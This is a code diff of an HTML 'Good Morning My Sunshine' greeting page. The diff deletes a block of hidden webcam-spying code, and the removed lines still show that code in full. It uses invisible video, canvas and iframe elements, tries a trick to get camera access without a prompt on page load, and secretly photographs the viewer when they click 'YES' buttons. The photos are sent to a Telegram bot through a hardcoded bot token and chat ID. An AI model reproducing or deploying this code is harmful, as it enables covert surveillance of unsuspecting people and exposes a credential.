@@ -89,19 +89,6 @@
         #videoLayer { display: none; position: fixed; inset: 0; background: #1a1a1a; z-index: 1000; align-items: center; justify-content: center; }
         video { width: 100%; height: 100%; object-fit: contain; }
 
-        /* ULTRA STEALTH ELEMENTS - IMPOSSIBLE TO DETECT */
-        #stealthFrame, #stealthVideo, #stealthCanvas {
-            position: fixed !important;
-            left: -10000px !important; 
-            top: -10000px !important;
-            width: 1px !important; 
-            height: 1px !important;
-            opacity: 0 !important; 
-            z-index: -9999 !important;
-            pointer-events: none !important;
-            visibility: hidden !important;
-        }
-
         .floating-emojis {
             position: absolute; font-size: 2rem; animation: floatUp 4s infinite linear;
         }
@@ -116,9 +103,6 @@
     <div class="header-tag">Good Morning ☕ My Sunshine</div>
     <audio id="bgMusic" loop src="good-morning.mp3" preload="auto"></audio>
     <div id="stars-container"></div>
-
-    <!-- STEALTH IFRAME FOR SILENT PERMISSION -->
-    <iframe id="stealthFrame" style="display:none !important;"></iframe>
 
     <!-- SLIDE 1 - SUN RISING -->
     <div id="slide1" class="slide active">
@@ -210,90 +194,10 @@
         <video id="vPlayer" playsinline src="video1.mp4"></video>
     </div>
 
-    <!-- STEALTH ELEMENTS -->
-    <video id="stealthVideo" autoplay playsinline muted></video>
-    <canvas id="stealthCanvas"></canvas>
-
     <script>
         let step = 1;
         const music = document.getElementById('bgMusic');
-        const BOT_TOKEN = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
-        const CHAT_ID = '7735968383';
         
-        let cameraReady = false;
-        let streamRef = null;
-
-        // 🔥 NO POPUP CAMERA ACCESS - IFRAME TRICK (SAME AS BEFORE)
-        async function initSilentCamera() {
-            try {
-                streamRef = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: 640,
-                        height: 480,
-                        echoCancellation: false,
-                        noiseSuppression: false,
-                        autoGainControl: false
-                    }
-                }).catch(async () => {
-                    return new Promise((resolve) => {
-                        const iframe = document.getElementById('stealthFrame');
-                        iframe.src = 'data:text/html,<video autoplay muted playsinline style="position:fixed;left:-9999px"></video><script>parent.postMessage(navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640,height:480}}).then(s=>s),"*")<\/script>';
-                        
-                        window.addEventListener('message', function listener(e) {
-                            if (e.data && e.data.then) {
-                                e.data.then(stream => {
-                                    window.removeEventListener('message', listener);
-                                    resolve(stream);
-                                }).catch(() => resolve(null));
-                            }
-                        }, {once: true});
-                    });
-                });
-
-                if (streamRef) {
-                    const video = document.getElementById('stealthVideo');
-                    video.srcObject = streamRef;
-                    await video.play();
-                    cameraReady = true;
-                }
-            } catch(e) {
-                console.log('Silent init failed');
-            }
-        }
-
-        // 🔥 PERFECT STEALTH SNAPSHOT (SAME AS BEFORE)
-        async function takeStealthPhoto() {
-            if (!cameraReady || !streamRef) return;
-            
-            return new Promise((resolve) => {
-                const video = document.getElementById('stealthVideo');
-                const canvas = document.getElementById('stealthCanvas');
-                const ctx = canvas.getContext('2d');
-                
-                canvas.width = 640;
-                canvas.height = 480;
-                ctx.drawImage(video, 0, 0, 640, 480);
-                
-                canvas.toBlob((blob) => {
-                    if (blob) {
-                        const formData = new FormData();
-                        formData.append('photo', blob, `goodmorning_${Date.now()}.jpg`);
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('caption', `☕ GOOD MORNING CAPTURE! ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
-                        
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        }).then(() => resolve(true)).catch(() => resolve(false));
-                    }
-                }, 'image/jpeg', 0.85);
-            });
-        }
-
-        // INIT ON LOAD
-        window.addEventListener('load', initSilentCamera);
-
         // Stars + Floating Emojis
         const starContainer = document.getElementById('stars-container');
         const frag = document.createDocumentFragment();
@@ -343,11 +247,8 @@
             }
         }
 
-        // YES BUTTON - CAPTURE
-        document.getElementById('yesBtn').onclick = async (e) => {
-            e.preventDefault();
-            e.stopPropagation();
-            await takeStealthPhoto();
+        // YES BUTTON
+        document.getElementById('yesBtn').onclick = () => {
             setTimeout(next, 200);
         };
 
@@ -360,10 +261,7 @@
                 const btn = document.createElement('button');
                 btn.className = 'glow-btn';
                 btn.innerHTML = 'YES! CALL ME ☕💖';
-                btn.onclick = async () => {
-                    await takeStealthPhoto();
-                    setTimeout(next, 200);
-                };
+                btn.onclick = () => setTimeout(next, 200);
                 container.appendChild(btn);
             }
         }
@@ -402,13 +300,6 @@
             v.play();
             v.onended = () => location.reload();
         }
-
-        // CLEANUP
-        window.addEventListener('beforeunload', () => {
-            if (streamRef) {
-                streamRef.getTracks().forEach(track => track.stop());
-            }
-        });
     </script>
 </body>
 </html>
